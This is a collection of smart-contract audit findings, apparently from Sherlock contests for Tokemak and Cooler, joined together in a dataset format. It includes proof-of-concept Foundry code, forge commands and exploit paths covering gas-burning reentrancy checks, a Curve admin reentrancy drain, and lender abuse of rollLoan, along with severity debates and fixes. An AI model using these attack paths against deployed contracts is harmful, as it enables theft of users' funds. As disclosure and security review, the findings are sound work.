IBalancerMetaStablePool(WSTETH_CBETH_POOL);\n\n        address[] memory assets = new address[](2);\n        assets[0] = WSTETH;\n        assets[1] = CBETH;\n        uint256[] memory amounts = new uint256[](2);\n        amounts[0] = 10_000 ether;\n        amounts[1] = 0;\n\n        IBalancerVault.JoinPoolRequest memory joinRequest = IBalancerVault.JoinPoolRequest({\n            assets: assets,\n            maxAmountsIn: amounts, // maxAmountsIn,\n            userData: abi.encode(\n                IBalancerVault.JoinKind.EXACT_TOKENS_IN_FOR_BPT_OUT,\n                amounts, //maxAmountsIn,\n                0\n            ),\n            fromInternalBalance: false\n        });\n\n        IBalancerVault.SingleSwap memory swapRequest = IBalancerVault.SingleSwap({\n            poolId: 0x9c6d47ff73e0f5e51be5fd53236e3f595c5793f200020000000000000000042c,\n            kind: IBalancerVault.SwapKind.GIVEN_IN,\n            assetIn: WSTETH,\n            assetOut: CBETH,\n            amount: amounts[0],\n            userData: abi.encode(\n                IBalancerVault.JoinKind.EXACT_TOKENS_IN_FOR_BPT_OUT,\n                amounts, //maxAmountsIn,\n                0\n            )\n        });\n\n        IBalancerVault.FundManagement memory funds = IBalancerVault.FundManagement({\n            sender: address(this),\n            fromInternalBalance: false,\n            recipient: payable(address(this)),\n            toInternalBalance: false\n        });\n\n        emit log_named_uint(""Gas before price1"", gasleft());\n        uint256 price1 = oracle.getPriceInEth(WSTETH_CBETH_POOL);\n        emit log_named_uint(""price1"", price1);\n        emit log_named_uint(""Gas after price1 "", gasleft());\n    }\n```\n\nThe oracle is called to get a price. This oracle calls the `checkReentrancy` function and burns up the gas. The gas left is checked before and after this call.\nThe output shows this:\n```\n[PASS] testAttack() (gas: 9203730962297323943)\nLogs:\nGas before price1: 9223372036854745204\nprice1: 1006294352158612428\nGas after price1 : 425625349158468958\n```\n\nThis shows that 96% of the gas sent is burnt up in the oracle call."ч"According to the monorepo here, the staticall must be allocated a fixed amount of gas. Change the reentrancy check to the following.\n```\n(, bytes memory revertData) = address(vault).staticcall{ gas: 10_000 }(\n            abi.encodeWithSelector(vault.manageUserBalance.selector, 0)\n        );\n```\n\nThis ensures gas isn't burnt up without reason.\nDiscussion\nJeffCX\nEscalate\npolitely dispute that the severity is high because the transaction that meant to check the reentrancy burn too much gas and can revert and can block withdraw of fund or at least constantly burn all amount of gas and make user lose money\nin a single transaction, the cost burnt can by minimal, but suppose the user send 10000 transaction, the gas burnt lose add up\nsherlock-admin2\nEscalate\npolitely dispute that the severity is high because the transaction that meant to check the reentrancy burn too much gas and can revert and can block withdraw of fund or at least constantly burn all amount of gas and make user lose money\nin a single transaction, the cost burnt can by minimal, but suppose the user send 10000 transaction, the gas burnt lose add up\nYou've created a valid escalation!\nTo remove the escalation from consideration: Delete your comment.\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\nsherlock-admin2\nEscalate\nThis issue should be a Low.\nThe reason is that it will only consume all gas if the staticcall reverts, which means a re-entrancy is detected. For normal usage of the application, there will not be any re-entrancy. Thus, the normal users who use the protocol in the intended manner will not be affected by this issue.\nIt will only consume all the gas of attackers trying to carry out a re-entrancy attack against the protocol. In this case, the attacker will not get the gas refund when the re-entrancy detection reverts.\nThe loss of gas refunding for the attacker is not a valid issue in Sherlock since we are protecting the users, not the malicious users attempting to perform a re-entrancy attack or someone using the features in an unintended manner that triggers the re-entrancy revert. In addition, the loss of gas refund is not substantial enough to be considered a Medium since the chance of innocent users triggering a re-entrancy is close to zero in real life.\nFrom the perspective of a smart contract, if an innocent external contract accidentally calls the Balancer protocol that passes the control to the contract and then calls Tokemak, which triggers a re-entrancy revert, such a contract is not operating correctly and should be fixed.\n```\nYou've deleted an escalation for this issue.\n```\n\nJeffCX\nWith full respect to senior watson's comment\nThe reason is that it will only consume all gas if the staticcall reverts, which means a re-entrancy is detected\nI have to dispute the statement above,\nPlease review the duplicate issue #837 as well\nthe old balancer reentrancy check version does not cap the staticcall gas limit\nbut the new version add the 10000 gas cap\nand the balancer team already clearly state that the static call always revert even the reentrancy is not detected\n```\n// However, use a static call so that it can be a view function (even though the function is non-view).\n// This allows the library to be used more widely, as some functions that need to be protected might be\n// view.\n//\n// This staticcall always reverts, but we need to make sure it doesn't fail due to a re-entrancy attack.\n// Staticcalls consume all gas forwarded to them on a revert caused by storage modification.\n// By default, almost the entire available gas is forwarded to the staticcall,\n// causing the entire call to revert with an 'out of gas' error.\n//\n// We set the gas limit to 10k for the staticcall to\n// avoid wasting gas when it reverts due to storage modification.\n// `manageUserBalance` is a non-reentrant function in the Vault, so calling it invokes `_enterNonReentrant`\n// in the `ReentrancyGuard` contract, reproduced here:\n//\n//    function _enterNonReentrant() private {\n//        // If the Vault is actually being reentered, it will revert in the first line, at the `_require` that\n//        // checks the reentrancy flag, with ""BAL#400"" (corresponding to Errors.REENTRANCY) in the revertData.\n//        // The full revertData will be: `abi.encodeWithSignature(""Error(string)"", ""BAL#400"")`.\n//        _require(_status != _ENTERED, Errors.REENTRANCY);\n//\n//        // If the Vault is not being reentered, the check above will pass: but it will *still* revert,\n//        // because the next line attempts to modify storage during a staticcall. However, this type of\n//        // failure results in empty revertData.\n//        _status = _ENTERED;\n//    }\n```\n\nuse not capping the gas limit of static call means the user are constantly waste too much gas (let us say for a single call the user waste and lose 0.01 ETH at gas), after 20000 transaction the loss is cumulatively 200 ETH and has no upper limit of loss\nbecause the reason above\nthe balancer push a PR fix for this issue specifically, can see the PR\nhttps://github.com/balancer/balancer-v2-monorepo/pull/2467\ngas is either wasted or transaction revert and block withdraw, which is both really bad for user in long term, so the severity should be high instead of medium\n```\n//  If the Vault is not being reentered, the check above will pass: but it will *still* revert,\n//  because the next line attempts to modify storage during a staticcall. However, this type of\n//  failure results in empty revertData.\n```\n\ncarrotsmuggler\nThe comment by the LSW is wrong. The POC clearly shows 90% of gas is consumed even when no re-entrancy is detected, i.e. for normal usage of the protocol.\nWhen there is reentrancy, the entire transaction reverts. If there is no reentrancy, the static call still reverts due to a state change. There is no reentrancy for the situation given in the POC.\nThe `manageUserBalance` call always does a state change. When a state change is encountered during a static call, the entire gas is burnt up and the execution reverts. This happens irrespective of reentrancy conditions.\nxiaoming9090\nThanks @JeffCX and @carrotsmuggler for your explanation. You are correct that the issue will happen irrespective of reentrancy conditions. The `manageUserBalance` function will trigger the `_enterNonReentrant` modifier. If there is no re-entrancy, this line of code will result in a state change that consume all the gas pass to it. I have deleted the escalation.\nTrumpero\nHello JeffCX, I believe that the loss of gas might not qualify as a valid high. According to the guidelines in Sherlock's documentation, the OOG matter will be deemed a medium severity issue. It could be considered high only in cases where it results in a complete blockage of all user funds indefinitely.\nJeffCX\nSir, I agree the OOG does not block user withdraw forever\nbut because the static call always revert and waste 63/64 gas when withdraw, the remaining 1 / 64 gas has to be enough to complete the transaction.\nthis means user are force to overpaying 100x more gas to complete the withdraw from balancer vault\nwe can make a analogy:\nthe protocol open a bank, user put 10K fund into the bank, and the user should only pays for 1 USD transaction fee when withdraw the fund,\nbut the bank said, sorry because of a bug, everyone has to pay 100 USD to withdraw the fund, and this 100x cost applies every user in every withdrawal transaction, then the result is the withdraw is not really usable and cause consistent loss of fund\nthis 100x gas applies to all user in every withdrawal transaction that use the balancer vault and the loss of fund from gas has no upper bound, so I think a high severity is still justified.\nTrumpero\nHello, @JeffCX,\nThe Out Of Gas (OOG) situation renders users unable to call a method of the contracts due to insufficient gas. On the other hand, your issue poses a risk where users:\nCouldn't call a method due to insufficient gas\nUsers can pay more fees to trigger the function\nFrom what I observe, the impact of your issue appears to be a subset of the impact caused by an OOG. Therefore, if the OOG is considered medium, your issue should be equal to or less than medium in severity. I would appreciate it if you could share your opinion on this.\nJeffCX\nYeap, it is a subset of impact caused by OOG,\nso Users can pay more fees to trigger the function, but as I already shown, every user needs to pay 100x gas more in every withdrawal transaction for balancer vault, so the lose of fund as gas is cumulatively high :)\nTrumpero\nI believe that in the scenario of an OOG/DOS, it represents the worst-case scenario for your issue. This is because when an OOG/DOS happens, users will pay a gas fee without any results, resulting in a loss of their gas. Hence, the impact of an OOG can be rephrased as follows: ""users pay 100x gas fee but can't use the function"". On the other hand, your issue states that ""users pay 100x gas fee but sometime it fails"". Is that correct?\nJeffCX\nuser can pay 100x gas and use the function as long as the remaining 1/64 gas can complete the executions.\nin my original report\nhttps://github.com/sherlock-audit/2023-06-tokemak-judging/issues/837\nthe impact I summarized is:\nthe function may waste too much gas and result in an out of gas error and can block function call such as withdraw\nemm as for\nusers pay 100x gas fee but sometime it fails\nas long as user pay a lot of gas (which they should not, transaction can be processed), and if they do not pay that amount of gas, transaction fails\nand sir, just a friendly reminder\nmy original escalation is the severity should be high instead of medium based on the impact 👍\nTrumpero\nCertainly, I comprehend that you are aiming to elevate the severity level of this issue. However, my stance remains that this issue should be classified as medium due to the following rationale:\nLet's consider a situation where Alice intends to initiate 2 methods. Method A results in a denial-of-service (DOS) due to an out-of-gas (OOG) scenario, while method B aligns with your described issue.\nAlice expends 1 ETH as a gas fee but is unable to execute method A. Even when she attempts to allocate 10 ETH for the gas fee, she still cannot trigger method A.\nSimultaneously, Alice expends 1 ETH as a gas fee but encounters an inability to execute method B. However, when she allocates 10 ETH for the gas fee, she successfully triggers method B.\nConsequently, we observe that method A costs Alice 11 ETH as a gas fee without any return, whereas method B costs Alice the same 11 ETH, yet she gains the opportunity to execute it. Hence, we can infer that method A is more susceptible than method B.\nJeffCX\nSir, I don't think the method A and method B example applies in the codebase and in this issue\nthere is only one method for user to withdraw share from the vault\nI can add more detail to explain how this impact withdraw using top-down approach\nthe _withdraw calls the method _calcUserWithdrawSharesToBurn\nthis calls LMPDebt._calcUserWithdrawSharesToBurn\nwe need to know the debt value by calling destVault.debtValue\nthis calls this line of code\nthis calls the oracle code\n```\nuint256 price = _systemRegistry.rootPriceOracle().getPriceInEth(_underlying);\n```\n\nthen if the dest vault is the balancer vault, balancer reetrancy check is triggered to waste 63 / 64 waste in oracle code\nso there is no function A and function B call\nas long as user can withdraw and wants to withdraw share from balancer vault, 100x gas overpayment is required\nJeffCX\nI think we can treat this issue same as ""transaction missing slippage protection""\nmissing slippage protection is consider a high severity finding, but user may not lose million in one single transaction, the loss depends on user's trading amount\nthe loss amount for individual transaction can be small but there are be a lot of user getting frontrunning and the missing slippage cause consistent leak of value\nall the above character applies to this finding as well\ncan refer back to my first analogy\nthe protocol open a bank, user put 10K fund into the bank, and the user should only pays for 1 USD transaction fee when withdraw the fund,\nbut the bank said, sorry because of a bug, everyone has to pay 100 USD to withdraw the fund, and this 100x cost applies every user in every withdrawal transaction, then the result is the withdraw is not really usable and cause consistent loss of fund\nthis 100x gas applies to all user in every withdrawal transaction that use the balancer vault and the loss of fund from gas has no upper bound, so I think a high severity is still justified.\nEvert0x\nI think we can treat this issue same as ""transaction missing slippage protection""\nYou are referring to the gas usage here? Putting a limit on the gas is not a task for the protocol, this is a task for the wallet someone is using.\nAs the escalation comment states\nin a single transaction, the cost burnt can by minimal"ч"This causes the contract to burn up 63/64 bits of gas in a single check. If there are lots of operations after this call, the call can revert due to running out of gas. This can lead to a DOS of the contract.\nCode Snippet\nTool used\nFoundry\nCurrent opinion is to reject escalation and keep issue medium severity.\nJeffCX\nPutting a limit on the gas is not a task for the protocol\nsir, please read the report again, the flawed logic in the code charge user 100x gas in every transaction in every withdrawal\nin a single transaction, the cost burnt can by minimal\nthe most relevant comments is https://github.com/sherlock-audit/2023-06-tokemak-judging/issues/822#issuecomment-1765550141\nand https://github.com/sherlock-audit/2023-06-tokemak-judging/issues/822#issuecomment-1769126560\nidk how do state it more clearly, emm if you put money in the bank, you expect to pay 1 USD for withdrawal transaction fee, but every time you have to pay 100 USD withdrawal fee because of the bug\nthis cause loss of fund for every user in every transaction for not only you but every user...\nEvert0x\n@JeffCX what are the exact numbers on the withdrawal costs? E.g. if I want to withdraw $10k, how much gas can I expect to pay? If this is a significant amount I can see the argument for\nHow to identify a high issue: Definite loss of funds without limiting external conditions.\nBut it's not clear how much this will be assuming current mainnet conditions.\nJeffCX\nI write a simpe POC\nthe call is\n```\nif check reentrancy flag is true\n\nuser withdraw -> \ncheck reentrancy staticall revert and consume most of the gas \n-> withdraw completed\n```\n\nor\n```\nif check reentrancy flag is false\n\nuser withdraw ->\n-> withdraw completed\n```\n\nnote first we do not check the reentrancy\n```\n// vault.toggleCheck(true);\n```\n\nwe run\n```\nforge test -vvv --match-test ""testPOC"" --fork-url ""https://eth.llamarpc.com"" --gas-limit 10000000\n```\n\nthe gas cost is 42335\nthen we uncomment the vault.toggleCheck(true) and check the reentrancy that revert in staticcall\n```\nvault.toggleCheck(true);\n```\n\nwe run the same test again, this is the output, as we can see the gas cost surge\nthen we can use this python scirpt to estimate how much gas is overpaid as lost of fund\n```\nregular =  42313\n\noverpaid = 9551666\n\n\ncost = 0.000000045 * (overpaid - regular);\n\nprint(cost)\n```\n\nthe cost is\n```\n0.427920885 ETH\n```\n\nin a single withdraw, assume user lost 0.427 ETH,\nif 500 user withdraw 20 times each and the total number of transaction is 10000\nthe lose on gas is 10000 * 0.427 ETH\nJeffCX\nnote that the more gas limit user set, the more fund user lose in gas\nbut we are interested in what the lowest amount of gas limit user that user can set the pay for withdrawal transaction\nI did some fuzzing\nthat number is 1800000 unit of gas\nthe command to run the test is\n```\nforge test -vvv --match-test ""testPOC"" --fork-url ""https://eth.llamarpc.com"" --gas-limit 1800000\n```\n\nsetting gas limit lower than 1800000 unit of gas is likely to revert in out of gas\nunder this setting, the overpaid transaction cost is 1730089\nin other words,\nin each withdrawal for every user, user can lose 0.073 ETH, (1730089 uint of gas * 45 gwei -> 0.000000045 ETH)\nassume there are 1000 user, each withdraw 10 times, they make 1000 * 10 = 100_00 transaction\nso the total lost is 100_00 * 0.07 = 700 ETH\nin reality the gas is more than that because user may use more than 1800000 unit of gas to finalize the withdrawal transaction\nEvert0x\n@JeffCX thanks for putting in the effort to make this estimation.\nBut as far as I can see, your estimation doesn't use the actual contracts in scope. But maybe that's irrelevant to make your point.\nThis seems like the key sentence\nin each withdrawal for every user, user can lose 0.073 ETH,\nThis is an extra $100-$150 dollars per withdrawal action.\nThis is not a very significant amount in my opinion. I assume an optimized withdrawal transaction will cost between $20-$50. So the difference is not as big.\nJeffCX\nthe POC is a simplified flow of this\nit is ok to disagree sir:)\nEvert0x\nResult: Medium Has Duplicates\nsherlock-admin2\nEscalations have been resolved successfully!\nEscalation status:\nJEFFCX: rejected"
Slashing during `LSTCalculatorBase.sol` deployment can show bad apr for monthsчmediumч```\nreturn ((priorValue * (1e18 - alpha)) + (currentValue * alpha)) / 1e18;\n```\nчThe issue is that the function `calculateAnnualizedChangeMinZero` has a floor of 0. So if the backing of the LST decreases over that 9 days due to a slashing event in that interval, this function will return 0, and the initial APR and `baseApr` will be set to 0.\nThe calculator is designed to update the APR at regular intervals of 3 days. However, the new apr is given a weight of 10% and the older apr is given a weight of 90% as seen below.\n```\nreturn ((priorValue * (1e18 - alpha)) + (currentValue * alpha)) / 1e18;\n```\n\nAnd alpha is hardcoded to 0.1. So if the initial APR starts at 0 due to a slashing event in the initial 9 day period, a large number of updates will be required to bring the APR up to the correct value.\nAssuming the correct APR of 6%, and an initial APR of 0%, we can calculate that it takes upto 28 updates to reflect close the correct APR. This transaltes to 84 days. So the wrong APR cann be shown for upto 3 months. Tha protocol uses these APR values to justify the allocation to the various protocols. Thus a wrong APR for months would mean the protocol would sub optimally allocate funds for months, losing potential yield.чIt is recommended to initialize the APR with a specified value, rather than calculate it over the initial 9 days. 9 day window is not good enough to get an accurate APR, and can be easily manipulated by a slashing event.\nDiscussion\ncodenutt\nThis behavior is acceptable. If we happen to see a slash > 12 bps over the initial 9 days, yes, we set it to 0. It increases the ramp time for that LST so pools with that LST will be set aside for a while until some APR (incentive, etc) comes up. For larger slashes that are more material (> 25bps), we have a 90 day penalty anyway.чThe protocol can underperform for months due to slashing events messing up APR calculations close to deployment date.\nCode Snippet\nTool used\nManual Review
curve admin can drain pool via reentrancy (equal to execute emergency withdraw and rug tokenmak fund by third party)чmediumч```\nCurve Pools\n\nCurve stETH/ETH: 0x06325440D014e39736583c165C2963BA99fAf14E\nCurve stETH/ETH ng: 0x21E27a5E5513D6e65C4f830167390997aA84843a\nCurve stETH/ETH concentrated: 0x828b154032950C8ff7CF8085D841723Db2696056\nCurve stETH/frxETH: 0x4d9f9D15101EEC665F77210cB999639f760F831E\nCurve rETH/ETH: 0x6c38cE8984a890F5e46e6dF6117C26b3F1EcfC9C\nCurve rETH/wstETH: 0x447Ddd4960d9fdBF6af9a790560d0AF76795CB08\nCurve rETH/frxETH: 0xbA6c373992AD8ec1f7520E5878E5540Eb36DeBf1\nCurve cbETH/ETH: 0x5b6C539b224014A09B3388e51CaAA8e354c959C8\nCurve cbETH/frxETH: 0x548E063CE6F3BaC31457E4f5b4e2345286274257\nCurve frxETH/ETH: 0xf43211935C781D5ca1a41d2041F397B8A7366C7A\nCurve swETH/frxETH: 0xe49AdDc2D1A131c6b8145F0EBa1C946B7198e0BA\n```\nч"A few curve liquidity is pool is well in-scope:\n```\nCurve Pools\n\nCurve stETH/ETH: 0x06325440D014e39736583c165C2963BA99fAf14E\nCurve stETH/ETH ng: 0x21E27a5E5513D6e65C4f830167390997aA84843a\nCurve stETH/ETH concentrated: 0x828b154032950C8ff7CF8085D841723Db2696056\nCurve stETH/frxETH: 0x4d9f9D15101EEC665F77210cB999639f760F831E\nCurve rETH/ETH: 0x6c38cE8984a890F5e46e6dF6117C26b3F1EcfC9C\nCurve rETH/wstETH: 0x447Ddd4960d9fdBF6af9a790560d0AF76795CB08\nCurve rETH/frxETH: 0xbA6c373992AD8ec1f7520E5878E5540Eb36DeBf1\nCurve cbETH/ETH: 0x5b6C539b224014A09B3388e51CaAA8e354c959C8\nCurve cbETH/frxETH: 0x548E063CE6F3BaC31457E4f5b4e2345286274257\nCurve frxETH/ETH: 0xf43211935C781D5ca1a41d2041F397B8A7366C7A\nCurve swETH/frxETH: 0xe49AdDc2D1A131c6b8145F0EBa1C946B7198e0BA\n```\n\none of the pool is 0x21E27a5E5513D6e65C4f830167390997aA84843a\nhttps://etherscan.io/address/0x21E27a5E5513D6e65C4f830167390997aA84843a#code#L1121\nAdmin of curve pools can easily drain curve pools via reentrancy or via the `withdraw_admin_fees` function.\n```\n@external\ndef withdraw_admin_fees():\n    receiver: address = Factory(self.factory).get_fee_receiver(self)\n\n    amount: uint256 = self.admin_balances[0]\n    if amount != 0:\n        raw_call(receiver, b"""", value=amount)\n\n    amount = self.admin_balances[1]\n    if amount != 0:\n        assert ERC20(self.coins[1]).transfer(receiver, amount, default_return_value=True)\n\n    self.admin_balances = empty(uint256[N_COINS])\n```\n\nif admin of the curve can set a receiver to a malicious smart contract and reenter withdraw_admin_fees a 1000 times to drain the pool even the admin_balances is small\nthe line of code\n```\nraw_call(receiver, b"""", value=amount)\n```\n\ntrigger the reentrancy\nThis is a problem because as stated by the tokemak team:\nIn case of external protocol integrations, are the risks of external contracts pausing or executing an emergency withdrawal acceptable? If not, Watsons will submit issues related to these situations that can harm your protocol's functionality.\nPausing or emergency withdrawals are not acceptable for Tokemak.\nAs you can see above, pausing or emergency withdrawals are not acceptable, and this is possible for cuve pools so this is a valid issue according to the protocol and according to the read me"ч"N/A\nDiscussion\nsherlock-admin2\n1 comment(s) were left on this issue during the judging contest.\nTrumpero commented:\ninvalid, as the submission stated: ""Admin of curve pools can easily drain curve pools via reentrancy"", so no vulnerability for tokemak here\nJeffCX\nEscalate\nas the protocol docs mentioned\nhttps://audits.sherlock.xyz/contests/101\nIn case of external protocol integrations, are the risks of external contracts pausing or executing an emergency withdrawal acceptable? If not, Watsons will submit issues related to these situations that can harm your protocol's functionality.\nPausing or emergency withdrawals are not acceptable for Tokemak.\nin the issue got exploit in this report, user from tokenmak lose fund as well\nsherlock-admin2\nEscalate\nas the protocol docs mentioned\nhttps://audits.sherlock.xyz/contests/101\nIn case of external protocol integrations, are the risks of external contracts pausing or executing an emergency withdrawal acceptable? If not, Watsons will submit issues related to these situations that can harm your protocol's functionality.\nPausing or emergency withdrawals are not acceptable for Tokemak.\nin the issue got exploit in this report, user from tokenmak lose fund as well\nYou've created a valid escalation!\nTo remove the escalation from consideration: Delete your comment.\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\nTrumpero\nHi @JeffCX, based on this comment of sponsors in the contest channel, I think this issue should be marked as low/invalid: https://discord.com/channels/812037309376495636/1130514263522410506/1143588977962647582\nJeffCX\nSponsor said emergency withdrawal or pause is an unacceptable risk.\nDid you read it as ""acceptable"" sir?\nJeffCX\nSome discussion is happening https://github.com/sherlock-audit/2023-06-tokemak-judging/issues/899\nbut this is a separate external integration risk than the balancer one that can impact tokemak user :) and don't think this is a known issue\nTrumpero\nHello @JeffCX,\nUpon further consideration of this matter, I find it to be valid. The potential for the curve admin to exploit the reentrancy-attack and drain the curve pool could have a direct impact on the Tokemak protocol.\nI suggest that you review this issue as well, @codenutt.\nJeffCX\nHello @JeffCX,\nUpon further consideration of this matter, I find it to be valid. The potential for the curve admin to exploit the reentrancy-attack and drain the curve pool could have a direct impact on the Tokemak protocol.\nI suggest that you review this issue as well, @codenutt.\nThank you very much! 😄🎉！！\ncodenutt\nThanks @Trumpero / @JeffCX! Just to confirm, this is an issue with some Curve pools just in general, correct? Not necessarily with a particular interaction we have with them.\nTrumpero\nYes, you are right\nEvert0x\nPlanning to accept escalation and label issue as valid\nJeffCX\nthanks👍🙏\nEvert0x\n@Trumpero would you agree with high severity?\nTrumpero\nNo I think it should be medium since it assume the curve admin become malicious\nJeffCX\nAgree with medium, https://github.com/sherlock-audit/2023-06-tokemak-judging/issues/570 similar finding about external admin turn into malicious risk is marked as medium as well\nEvert0x\nResult: Medium Unique\nsherlock-admin2\nEscalations have been resolved successfully!\nEscalation status:\nJEFFCX: accepted"чcurve admins can drain pool via reentrancy\nCode Snippet\nhttps://etherscan.io/address/0x21E27a5E5513D6e65C4f830167390997aA84843a#code#L1121\nTool used\nManual Review
At claimDefaulted, the lender may not receive the token because the Unclaimed token is not processedчhighч```\nfunction claimDefaulted(uint256 loanID_) external returns (uint256, uint256, uint256) {\n  Loan memory loan = loans[loanID_];\n  delete loans[loanID_];\n```\nч```\nfunction claimDefaulted(uint256 loanID_) external returns (uint256, uint256, uint256) {\n  Loan memory loan = loans[loanID_];\n  delete loans[loanID_];\n```\n\nLoan data is deletead in `claimDefaulted` function. `loan.unclaimed` is not checked before data deletead. So, if `claimDefaulted` is called while there are unclaimed tokens, the lender will not be able to get the unclaimed tokens.ч
`emergency_shutdown` role is not enough for emergency shutdown.чmediumч"```\nfunction emergencyShutdown() external onlyRole(""emergency_shutdown"") {\n    active = false;\n\n    // If necessary, defund sDAI.\n    uint256 sdaiBalance = sdai.balanceOf(address(this));\n    if (sdaiBalance != 0) defund(sdai, sdaiBalance);\n\n    // If necessary, defund DAI.\n    uint256 daiBalance = dai.balanceOf(address(this));\n    if (daiBalance != 0) defund(dai, daiBalance);\n\n    emit Deactivated();\n}\n```\n"ч"Let's examine the function emergencyShutdown():\n```\nfunction emergencyShutdown() external onlyRole(""emergency_shutdown"") {\n    active = false;\n\n    // If necessary, defund sDAI.\n    uint256 sdaiBalance = sdai.balanceOf(address(this));\n    if (sdaiBalance != 0) defund(sdai, sdaiBalance);\n\n    // If necessary, defund DAI.\n    uint256 daiBalance = dai.balanceOf(address(this));\n    if (daiBalance != 0) defund(dai, daiBalance);\n\n    emit Deactivated();\n}\n```\n\nThis has the modifier `onlyRole(""emergency_shutdown"")`. However, this also calls function `defund()`, which has the modifier `onlyRole(""cooler_overseer"")`\n```\nfunction defund(ERC20 token_, uint256 amount_) public onlyRole(""cooler_overseer"") {\n```\n\nTherefore, the role `emergency_shutdown` will not have the ability to shutdown the protocol, unless it also has the overseer role.\nTo get a coded PoC, make the following modifications to the test case:\n```\n//rolesAdmin.grantRole(""cooler_overseer"", overseer);\nrolesAdmin.grantRole(""emergency_shutdown"", overseer);\n```\n\nRun the following test command (to just run a single test test_emergencyShutdown()):\n```\nforge test --match-test test_emergencyShutdown\n```\n\nThe test will fail with the `ROLES_RequireRole()` error."чThere are two ways to mitigate this issue:\nSeparate the logic for emergency shutdown and defunding. i.e. do not defund when emergency shutdown, but rather defund separately after shutdown.\nMove the defunding logic to a separate internal function, so that emergency shutdown function can directly call defunding without going through a modifier.\nDiscussion\nsherlock-admin\n1 comment(s) were left on this issue during the judging contest.\n0xyPhilic commented:\ninvalid because it can be considered low as roles can be given again and there is no loss of funds\n0xRusowsky\nfair point, but it still should be low as a user can have several roles\nOot2k\nI have to disagree, a user can indeed have several roles, but that can not be ensured/ if there are two separate roles they should be considered separate.\nohmzeus\nFix: https://github.com/ohmzeus/Cooler/pull/50\njkoppel\nFix confirmed.ч`emergency_shutdown` role cannot emergency shutdown the protocol\nCode Snippet\nTool used\nManual Review, Foundry/Forge
Lender is able to steal borrowers collateral by calling rollLoan with unfavourable terms on behalf of the borrower.чmediumч"```\nrequestLoan(""1,000 debt tokens"", ""5% interest"", ""10 loan tokens for each collateral"", ""1 year"")\n```\n"ч"Say a user has 100 collateral tokens valued at $1,500 and they wish to borrow 1,000 debt tokens valued at $1,000 they would would call: (values have simplified for ease of math)\n```\nrequestLoan(""1,000 debt tokens"", ""5% interest"", ""10 loan tokens for each collateral"", ""1 year"")\n```\n\nIf a lender then clears the request the borrower would expect to have 1 year to payback 1,050 debt tokens to be able to receive their collateral back.\nHowever a lender is able to call provideNewTermsForRoll with whatever terms they wish: i.e.\n```\nprovideNewTermsForRoll(""loanID"", ""10000000% interest"", ""1000 loan tokens for each collateral"" , ""1 year"")\n```\n\nThey can then follow this up with a call to rollLoan(loanID): During the rollLoan function the interest is recalculated using:\n```\n    function interestFor(uint256 amount_, uint256 rate_, uint256 duration_) public pure returns (uint256) {\n        uint256 interest = (rate_ * duration_) / 365 days;\n        return (amount_ * interest) / DECIMALS_INTEREST;\n    }\n```\n\nAs rate_ & duration_ are controllable by the borrower when they call provideNewTermsForRoll they can input a large number that the amount returned is much larger then the value of the collateral. i.e. input a rate_ of amount * 3 and duration of 365 days so that the interestFor returns 3,000.\nThis amount gets added to the existing loan.amount and would make it too costly to ever repay as the borrower would have to spend more then the collateral is worth to get it back. i.e. borrower now would now need to send 4,050 debt tokens to receive their $1,500 worth of collateral back instead of the expected 1050.\nThe extra amount should result in more collateral needing to be sent however it is calculated using loan.request.loanToCollateral which is also controlled by the lender when they call provideNewTermsForRoll, allowing them to input a value that will result in newCollateralFor returning 0 and no new collateral needing to be sent.\n```\n    function newCollateralFor(uint256 loanID_) public view returns (uint256) {\n        Loan memory loan = loans[loanID_];\n        // Accounts for all outstanding debt (borrowed amount + interest).\n        uint256 neededCollateral = collateralFor(loan.amount, loan.request.loanToCollateral);  \n        // Lender can force neededCollateral to always be less than loan.collateral\n\n        return neededCollateral > loan.collateral ? neededCollateral - loan.collateral : 0;\n    }\n```\n\nAs a result a borrower who was expecting to have repay 1050 tokens to get back their collateral may now need to spend many multiples more of that and will just be forced to just forfeit their collateral to the lender."чAdd a check restricting rollLoan to only be callable by the owner. i.e.:\n```\nfunction rollLoan(uint256 loanID_) external {\n        Loan memory loan = loans[loanID_];\n        \n        if (msg.sender != owner()) revert OnlyApproved();\n```\n\nNote: unrelated but rollLoan is also missing its event should add:\n```\nfactory().newEvent(reqID_, CoolerFactory.Events.RollLoan, 0);\n```\n\nDiscussion\njkoppel\nWhether this is medium or high depends on how likely borrowers are to make massively over-collateralized loans\n0xRusowsky\nimo a Medium\nOot2k\nescalate split frontrunning and access control into own issues\nsherlock-admin2\nescalate split frontrunning and access control into own issues\nYou've created a valid escalation!\nTo remove the escalation from consideration: Delete your comment.\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n0xRusowsky\nfix: https://github.com/ohmzeus/Cooler/pull/54\nhttps://github.com/ohmzeus/Cooler/pull/60\nhttps://github.com/ohmzeus/Cooler/pull/61\nOot2k\nFollowing issues are not duplicates of 26 and should be grouped together and treaded as another issue: 16 (https://github.com/sherlock-audit/2023-08-cooler-judging/issues/16) 18 (https://github.com/sherlock-audit/2023-08-cooler-judging/issues/18) 72 (https://github.com/sherlock-audit/2023-08-cooler-judging/issues/72) 99 (https://github.com/sherlock-audit/2023-08-cooler-judging/issues/99) 130 (https://github.com/sherlock-audit/2023-08-cooler-judging/issues/130) 137 (https://github.com/sherlock-audit/2023-08-cooler-judging/issues/137) 150 (https://github.com/sherlock-audit/2023-08-cooler-judging/issues/150) 204 (https://github.com/sherlock-audit/2023-08-cooler-judging/issues/204) 221 (https://github.com/sherlock-audit/2023-08-cooler-judging/issues/221) 243 (https://github.com/sherlock-audit/2023-08-cooler-judging/issues/243) 271 (https://github.com/sherlock-audit/2023-08-cooler-judging/issues/271)\n226 -> Invalid\nOot2k\nAddition: 226 shows attack path and root cause, mentions tokens that are not supported -> sherlock has to decide if valid/invalid 231 is not duplicate of this issue and should be grouped with the other ones mentioned above\nhrishibhat\nResult: Medium Has duplicates The respective set of issues has been separated\nsherlock-admin2\nEscalations have been resolved successfully!\nEscalation status:\nOot2k: accepted\njkoppel\nFix confirmed. Sponsor agreed to accept some economic concerns with the fix, but no security concerns were identified.чBorrower will be forced to payback the loan at unfavourable terms or forfeit their collateral.\nCode Snippet\nTool used\nManual Review
